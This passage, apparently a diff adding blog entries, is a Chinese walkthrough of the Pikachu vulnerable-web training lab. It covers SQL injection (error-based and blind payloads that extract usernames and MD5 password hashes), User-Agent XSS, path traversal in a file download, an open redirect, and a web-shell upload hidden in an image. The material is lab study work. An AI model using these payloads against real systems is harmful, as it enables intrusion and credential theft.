+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>ok 成功！</p>
+<p><img src="/../../img/docs/pikachu/SQL-Inject/1738294011831-aa0fb395-fac8-4be4-9d34-ecb1926cf76b.png"></p>
+<p><strong>分析源码</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select username,id,email from member where username like &#x27;%<span class="subst">$name</span>%&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>发现和我们认为的构造方法是一样的。</p>
+<h1 id="xx-型注入"><a href="#xx-型注入" class="headerlink" title="xx 型注入"></a>xx 型注入</h1><p>发现还是 GET 请求，单引号报错，双引号不报错，但是报错错不一样，重新考虑对策。输入 vince’</p>
+<p><strong>报错为：</strong> ‘’vince’’)’  </p>
+<p>说明被单引号包裹()，又有括号存在。（括号可以表示集合）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; ... username = (&#x27;<span class="subst">$name</span>&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>于是我们可以进行构造</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username = (<span class="string">&#x27;&#x27;</span>) <span class="keyword">or</span> (<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>输入</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) or (&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>ok，完成</p>
+<p><strong>源码分析</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=(&#x27;<span class="subst">$name</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h1 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h1><p>开始就是注册，用 HackBar 插件，发现是 POST 请求</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=<span class="number">123456</span>&amp;sex=boy&amp;phonenum=<span class="number">110</span>&amp;email=addr&amp;add=addr&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>登录为 GET 请求，我们可以输错时可以明显发现</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?username=aaa&amp;password=aaa&amp;submit=Login</span><br></pre></td></tr></table></figure>
+
+<h2 id="从注册中入手"><a href="#从注册中入手" class="headerlink" title="从注册中入手"></a>从注册中入手</h2><p>这里并没有输出回显，我们看看报错会不会回显。</p>
+<p>输入下面的，通过 HackBar 进行运行（发现浏览器 POST 请求发送要按下两次，还以为输错了）</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;&amp;password=123456&amp;sex=boy&amp;phonenum=110&amp;email=addr&amp;add=addr&amp;submit=submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/SQL-Inject/1738313636350-93d7ecde-2e64-4b69-a50c-a9ff10e7a3b6.png"></p>
+<p>看到有报错，我们就可以使用常用的报错注入方法了。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27; and updatexml(1, version(), 1) or &#x27;</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123456</span><span class="operator">&amp;</span>sex<span class="operator">=</span>boy<span class="operator">&amp;</span>phonenum<span class="operator">=</span><span class="number">110</span><span class="operator">&amp;</span>email<span class="operator">=</span>addr<span class="operator">&amp;</span><span class="keyword">add</span><span class="operator">=</span>addr<span class="operator">&amp;</span>submit<span class="operator">=</span>submit</span><br></pre></td></tr></table></figure>
+
+<p>报错信息</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: <span class="string">&#x27;.26-0ubuntu0.18.04.1-log&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>前面被遮挡了，用波浪号标记一下</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27; and updatexml(1, concat(0x7e, version()), 1) or &#x27;</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123456</span><span class="operator">&amp;</span>sex<span class="operator">=</span>boy<span class="operator">&amp;</span>phonenum<span class="operator">=</span><span class="number">110</span><span class="operator">&amp;</span>email<span class="operator">=</span>addr<span class="operator">&amp;</span><span class="keyword">add</span><span class="operator">=</span>addr<span class="operator">&amp;</span>submit<span class="operator">=</span>submit</span><br></pre></td></tr></table></figure>
+
+<p>报错信息</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: <span class="string">&#x27;~5.7.26-0ubuntu0.18.04.1-log&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>把我们的 version 换成 database 就可以看到 php 调用的 mysql 是那个数据库了。这里的 updatexml 第一个和第三个参数应该随便填。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27; and updatexml(1, concat(0x7e, database()), 1) or &#x27;</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">123456</span><span class="operator">&amp;</span>sex<span class="operator">=</span>boy<span class="operator">&amp;</span>phonenum<span class="operator">=</span><span class="number">110</span><span class="operator">&amp;</span>email<span class="operator">=</span>addr<span class="operator">&amp;</span><span class="keyword">add</span><span class="operator">=</span>addr<span class="operator">&amp;</span>submit<span class="operator">=</span>submit</span><br></pre></td></tr></table></figure>
+
+<p>报错信息，我们调用的数据库名为 pikachu</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: <span class="string">&#x27;~pikachu&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们就不深入获取服务器的权限了，我们试试能不能获取所有用户的用户名即可。可以参考 “http header”注入。</p>
+<h1 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h1><p>我们随便输入一个文本，比如我输的是 50，然后点击 submit，就会发现一个删除超链接，发现是一个 GET 请求，用于删除文本来用的，我们就可以加一个单引号试试报不报错。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//192.168.17.129:8000/vul/sqli/sqli_del.php?id=61</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//192.168.17.129:8000/vul/sqli/sqli_del.php?id=61&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现报错，我们就可以使用报错注入的方法进行 SQL 注入了。更多参考 http header 注入这一节。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">61</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database())),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h1><p>我们输入密码后，可以看到，页面自动的获取了我们的 UA（User Agent）</p>
+<p><img src="/../../img/docs/pikachu/SQL-Inject/1739674683154-3deabf66-9cd6-4b47-990b-610eed46dc3a.png"></p>
+<p>我们就可以尝试修改 UA 达到一些目的。通过 BrupSuite 抓包。</p>
+<p><img src="/../../img/docs/pikachu/SQL-Inject/1739674903622-69a36ac2-88fd-4733-af92-26806a3a12e1.png"></p>
+<p>我们将其改成，发现可以回显，我们就发现一个** XSS 漏洞**。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">User-Agent: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/SQL-Inject/1739675026864-49ccc341-c04f-4e79-919a-62d3cca1588e.png"></p>
+<p>不过我们这里的是 SQL 注入的靶场，需要寻找 SQL 漏洞。</p>
+<p>我们直接输入 1’（注意有一个单引号），发现有报错，我们就可以使用到我们报错注入方法了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,&#x27;34338&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>查看数据库名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,(select database())),1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>‘ or 和 or ‘ 用于前后 sql 语句闭合，输出为~pikachu</p>
+<p>通过 MySQL 通用的方法对数据库名，表名，和用户密码的获取方式。下面是最后的 SQL 语句成品，我们也可以将 username 替换成 password，显示出来的可能是 MD5 编码过后的。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1, concat(0x7e, (select group_concat(username) from users)), 1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/SQL-Inject/1739676545759-4365253a-ae45-4e10-8e46-17c6a57f71e1.png"></p>
+<p>当然，刚才说的 username 替换成 password 也不是直接替换的，我们发现直接替换之后只会输出一个 MD5，可有可能一个也没输出完整，这是因为UPDATEXML函数最多输出32个字节，因此在提取较长的数据时可能需要使用substring函数进行分割。（在 PHP 中 MD5 默认是 32 字符的，又因为我们使用 UPDATAXML 头一个用的是 0x7e(也就是~)进行标注，导致还少了一个字符）。</p>
+<p>注意我们还需要使用 limit 第一个参数, 第二个参数（第一个参数是第几行，第二个行数是多少条）</p>
+<p><strong>第一次</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1, concat(0x7e, substring((select password from users limit 0, 1), 1, 32)), 1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/SQL-Inject/1739677469260-869a93da-2a3f-4e1e-8247-ce160d995a22.png"></p>
+<p><strong>第二次</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1, concat(0x7e, substring((select password from users limit 0, 1), 32, 1)), 1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/SQL-Inject/1739677453074-680c64b9-6c29-4ceb-a36e-35b93cceb289.png"></p>
+<p>所以第一个密码为（MD5 编码后的）</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure>
+
+<p>其余两个密码，如下（只展示前 31 位）</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1, concat(0x7e, substring((select password from users limit 1, 1), 1, 32)), 1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1, concat(0x7e, substring((select password from users limit 2, 1), 1, 32)), 1) or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>源码分析</strong></p>
+<p>用到了$_SERVER 获取了各种参数，然后存到 httpinfo 表中。后面的直接输出，就会出现报错回显和 XSS 漏洞。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//直接获取前端过来的头信息,没人任何处理,留下安全隐患</span></span><br><span class="line"><span class="variable">$remoteipadd</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$useragent</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$httpaccept</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>];</span><br><span class="line"><span class="variable">$remoteport</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_PORT&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞</span></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values(&#x27;<span class="subst">$is_login_id</span>&#x27;,&#x27;<span class="subst">$remoteipadd</span>&#x27;,&#x27;<span class="subst">$useragent</span>&#x27;,&#x27;<span class="subst">$httpaccept</span>&#x27;,&#x27;<span class="subst">$remoteport</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;http_main&quot;</span>&gt;</span><br><span class="line">    &lt;h1&gt;朋友，你好，你的信息已经被记录了：&lt;a href=<span class="string">&quot;sqli_header.php?logout=1&quot;</span>&gt;点击退出&lt;/a&gt;&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;你的ip地址:<span class="variable">$remoteipadd</span>&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;你的user agent:<span class="variable">$useragent</span>&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;你的http accept:<span class="variable">$httpaccept</span>&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;你的端口（本次连接）:tcp<span class="variable">$remoteport</span>&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="盲注-base-on-boolian"><a href="#盲注-base-on-boolian" class="headerlink" title="盲注(base on boolian)"></a>盲注(base on boolian)</h1><p>这个是<strong>基于布尔</strong>的盲注，也就是 True 和 False。</p>
+<p>可以发现，只要是正确的就有返回，错误的就没有返回，就可以利用这一点进行盲注，下面的代码是我们构造的 payload，发现数据库名的长度为 7 位。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and length(database())=7 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>同理，我们可以看第一个用户名(admin)的长度为 5。</p>
+<p>**注意一个坑：**select 出来的需要先加一个括号，length 的括号是函数本身的，所以我的 payload 中的 length 就有了两个括号包含。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and length((select username from users limit 0, 1))=5 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>爆破用户名</strong></p>
+<p>使用到了函数 substr，有三个参数，分别是字符串，第几个，截取多少字符</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and substr((select username from users limit 0, 1), 1, 1)=&#x27;</span>a<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<p>在这里我们可以使用 burpsuite 或者自己写脚本来进行爆破。</p>
+<p>这种爆破速度非常快，如果 26 字母组成的，最多需要 26*length 步就可以进行爆破出用户名，只需要修改 substr 第二个参数即可。</p>
+<h1 id="盲注-base-on-time"><a href="#盲注-base-on-time" class="headerlink" title="盲注(base on time)"></a>盲注(base on time)</h1><p>这个是<strong>基于时间</strong>的盲注。可以通过时间差来知道正确还是错误（对应着布尔盲注的 True 和 False），从而进行盲注，不做多赘述。总的来说，盲注最好使用工具，自己写脚本。</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1>]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Unsafe Filedownload</title>
+    <url>/posts/21842.html</url>
+    <content><![CDATA[<p>不安全的文件下载</p>
+<p>我们随便看一个下载链接</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://192.168.17.129:8000/vul/unsafedownload/execdownload.php?filename=kb.png</span><br></pre></td></tr></table></figure>
+
+<p>我们看到 filename&#x3D;kb.png 那我们将 filename 后面对应的文件改掉怎么样？我们发现文件不存在，这是怎么回事。</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://192.168.17.129:8000/vul/unsafedownload/execdownload.php?filename=down<span class="emphasis">_nba.php</span></span><br></pre></td></tr></table></figure>
+
+<p>我们通过浏览器看图片的相对路径，发现前面多了一个 download 文件夹，很像上一节的本地包含。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Filedownload&#x2F;1738548563371-688798e2-0762-4471-8a7c-f44b68e8fbae.png)</p>
+<p>说干就干，我们把路径改成下面这样</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://192.168.17.129:8000/vul/unsafedownload/execdownload.php?filename=../down<span class="emphasis">_nba.php</span></span><br></pre></td></tr></table></figure>
+
+<p>OK，down_nba.php 下载下来了。</p>
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>URL重定向</title>
+    <url>/posts/60126.html</url>
+    <content><![CDATA[<p><strong>不安全的 URL 跳转</strong></p>
+<p>很容易发现超链接用一个 url 进行 GET 传参，我们进行构造</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/urlredirect/urlredirect.php?url=https:<span class="comment">//www.baidu.com</span></span><br></pre></td></tr></table></figure>
+
+<p>发现，很容易就进入了百度的页面。</p>
+<p>并且当我们输入..&#x2F;的时候，就一个目录吧，也会出现铭感信息泄露的问题（可能是这个靶场本来就没有做，笑）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/urlredirect/urlredirect.php?url=../</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Unsafe Fileupload</title>
+    <url>/posts/55331.html</url>
+    <content><![CDATA[<p>不安全的文件上传</p>
+<h1 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h1><p><strong>客户端检测</strong></p>
+<p>他说这里只允许上传图片，我们就看看这里的 HTML 语句，发现有一个 JS 代码限制了文件的类型。我们可以常识一下禁止 JS 代码或者修改 JS 代码。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFileExt</span>(<span class="params">filename</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="literal">false</span>; <span class="comment">//状态</span></span><br><span class="line">  <span class="keyword">var</span> arr = [<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>];</span><br><span class="line">  <span class="comment">//取出上传文件的扩展名</span></span><br><span class="line">  <span class="keyword">var</span> index = filename.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> ext = filename.<span class="title function_">substr</span>(index+<span class="number">1</span>);</span><br><span class="line">  <span class="comment">//比较</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.<span class="property">length</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(ext == arr[i])</span><br><span class="line">      &#123;</span><br><span class="line">        flag = <span class="literal">true</span>; <span class="comment">//一旦找到合适的，立即退出循环</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//条件判断</span></span><br><span class="line">  <span class="keyword">if</span>(!flag)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;上传的文件不符合要求，请重新选择！&quot;</span>);</span><br><span class="line">    location.<span class="title function_">reload</span>(<span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们采用了禁止 JS 代码运行，我直接上传了一句话木马，网页直接给我了相对位置了。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">uploads/hack.<span class="property">php</span></span><br></pre></td></tr></table></figure>
+
+<p>然后用蚁剑去利用。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738549392898-996977a9-c72b-40ee-ac13-a431ff0347de.png)</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738549418881-2f414217-a66d-42de-b33a-03c057ffba9d.png)</p>
+<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p><strong>MIME</strong> 是描述消息内容类型的标准。</p>
+<p><a href="https://www.runoob.com/http/mime-types.html">https://www.runoob.com/http/mime-types.html</a></p>
+<p>**MIME **类型通用结构</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">type/subtype</span><br></pre></td></tr></table></figure>
+
+<p>这里我们查看浏览器，为 POST 请求，还有一个multipart&#x2F;form-data 是指定传输数据为二进制类型。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738549827916-c8398f53-d1b0-4aea-8149-77764ec12dda.png)</p>
+<p>我们尝试一下抓包，内容如下</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Disposition</span>: form-data; name=<span class="string">&quot;uploadfile&quot;</span>; filename=<span class="string">&quot;hack.png&quot;</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/octet-stream</span><br></pre></td></tr></table></figure>
+
+<p>看到类型为 applicaiton&#x2F;octet-stream 我们可以改成image&#x2F;png 或者其他图片类型看看。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738550444506-3f0ce96a-23f5-462e-9858-ec19dd76e650.png)</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738550462080-4f4d36ad-ac49-4019-89c0-5a529eaa3059.png)</p>
+<p>可以上传成功，我们用蚁剑去验证。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738550605915-9e95c319-40ad-4a6c-be0a-f4e45328297f.png)</p>
+<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h1><p>getimagesize 获取图片大小（用于看到底是不是图片的一个函数）</p>
+<p>我们看 DOS 命令中的 copy</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">COPY</span> [/<span class="type">D</span>] [/<span class="type">V</span>] [/<span class="type">N</span>] [/<span class="type">Y</span> | /-<span class="type">Y</span>] [/<span class="type">Z</span>] [/<span class="type">L</span>] [/<span class="type">A</span> | /<span class="type">B</span> ] source [/<span class="type">A</span> | /<span class="type">B</span>]</span><br><span class="line">     [+ <span class="type">source</span> [/<span class="type">A</span> | /<span class="type">B</span>] [+ <span class="type">...</span>]] [<span class="type">destination</span> [/<span class="type">A</span> | /<span class="type">B</span>]]</span><br><span class="line"></span><br><span class="line">  source       指定要复制的文件。</span><br><span class="line">  /A           表示一个 ASCII 文本文件。</span><br><span class="line">  /B           表示一个二进位文件。</span><br><span class="line">  /D           允许解密要创建的目标文件</span><br><span class="line">  destination  为新文件指定目录和/或文件名。</span><br><span class="line">  /V           验证新文件写入是否正确。</span><br><span class="line">  /N           复制带有非 <span class="number">8</span>dot3 名称的文件时，</span><br><span class="line">               尽可能使用短文件名。</span><br><span class="line">  /Y           不使用确认是否要覆盖现有目标文件</span><br><span class="line">               的提示。</span><br><span class="line">  /<span class="literal">-Y</span>          使用确认是否要覆盖现有目标文件</span><br><span class="line">               的提示。</span><br><span class="line">  /Z           用可重新启动模式复制已联网的文件。</span><br><span class="line">/L           如果源是符号链接，请将链接复制</span><br><span class="line">               到目标而不是源链接指向的实际文件。</span><br><span class="line"></span><br><span class="line">命令行开关 /Y 可以在 COPYCMD 环境变量中预先设定。</span><br><span class="line">这可能会被命令行上的 /<span class="literal">-Y</span> 替代。除非 <span class="built_in">COPY</span></span><br><span class="line">命令是在一个批处理脚本中执行的，默认值应为</span><br><span class="line">在覆盖时进行提示。</span><br><span class="line"></span><br><span class="line">要附加文件，请为目标指定一个文件，为源指定</span><br><span class="line">数个文件(用通配符或 file1+file2+file3 格式)。</span><br></pre></td></tr></table></figure>
+
+<p>copy 中的加号是用于将多个文件合并成一个文件的意思。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> /b hack.php+<span class="number">2</span>.jpg hack.jpg</span><br></pre></td></tr></table></figure>
+
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738551337714-2852671a-667c-40ad-b550-593e0e01fd0d.png)</p>
+<p>发现图片大了</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738551380903-ddc2d3b4-2a51-4737-8ce6-25ad0daebe4d.png)</p>
+<p><strong>解决方法</strong></p>
+<ol>
+<li><strong>修改 php.ini 文件</strong></li>
+<li><strong>上传小图片</strong></li>
+</ol>
+<p>我这里尝试一下修改 php.ini 文件</p>
+<p>查看 php.ini 位置，我们到 RCE 那章的 exec “eval”那节输入 phpinfo();</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738551687865-c3ccc0e7-8327-44fb-8352-28bd47aad4cc.png)</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">/etc/php/<span class="number">7.3</span>/apacha2/php.ini</span><br></pre></td></tr></table></figure>
+
+<p>我们进入 pikachu Docker 容器</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">docker exec <span class="literal">-it</span> [容器<span class="type">ID</span>] /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>我们通过 cd 找到文件，然后输入 vim php.ini，按下 i 编辑，去编辑，随便修改一下大小，最后按下 esc，再输入:wq，OK!</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552023012-9af8d68b-8010-401a-9c42-00e1b0da2672.png)</p>
+<p>哈哈，终于可以上传图片了，不过还是失败了，这是咋回事？</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552487267-b867d845-640d-4f94-b0e0-66607143d41c.png)</p>
+<p>我们用 010Editor 或者 winexe 查看文件的二进制和 16 禁止还有 ASCII 码看看。发现我们的 php 代码在前面，明显我们的 DOS 命令的顺序错误了，我们修改一下</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552548273-48cd6434-d9c6-48eb-9ed9-25962a10b3b1.png)</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> /b <span class="number">2</span>.jpg+ack.php hack.jpg</span><br></pre></td></tr></table></figure>
+
+<p>我们再次上传，我们发现应该是后端 getimagesize 设定是 512kb 的图片，又双叒叕踩坑了。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552701466-9de2af0b-5ab1-420c-8211-6b4415452082.png)</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552814587-0fe7cae6-728d-44bf-a14f-7021497f9fde.png)</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738552838685-b58c3555-cbd7-418b-a382-6c4c1a8b3ae8.png)</p>
+<p>我可以放到蚁剑去检验，发现没用，因为它被后端框架被识别是图片，只会展示出来，我们需要用上之前节的文件包含，才会被识别为 php 代码。因为 Include 即使有报错也会往下运行，所以非常欧克。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/fileinclude/fi_local.php?filename=file2.php&amp;submit=%E6%<span class="number">8</span>F%<span class="number">90</span>%E4%BA%A4%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">unsafeupload/uploads/<span class="number">2025</span>/<span class="number">02</span>/<span class="number">03</span>/<span class="number">72956067</span>a035f759000198096914.png</span><br></pre></td></tr></table></figure>
